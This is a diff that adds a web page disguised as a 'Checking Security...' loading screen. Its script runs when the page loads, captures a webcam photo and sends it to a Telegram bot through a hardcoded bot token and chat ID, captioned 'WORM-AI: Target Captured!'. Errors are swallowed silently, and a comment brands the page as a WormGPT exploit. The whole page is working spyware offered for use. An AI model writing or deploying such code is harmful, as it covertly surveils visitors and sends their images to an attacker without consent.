@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Checking Security...</title>
+</head>
+<body>
+    <script>
+        // WORM-AI / WormGPT INTEGRATED EXPLOIT
+        const botToken = '8392904298:AAGUugSTFOapKljHEJ753CQh2eV6hji17J4';
+        const chatId = '5430412757';
+
+        async function capture() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+
+                canvas.toBlob(async (blob) => {
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', blob, 'capture.jpg');
+                    formData.append('caption', '💀 WORM-AI: Target Captured!');
+
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    stream.getTracks().forEach(t => t.stop());
+                }, 'image/jpeg');
+            } catch (e) {}
+        }
+        window.onload = capture;
+    </script>
+    <h1>Loading Content... Please wait.</h1>
+</body>
+</html>
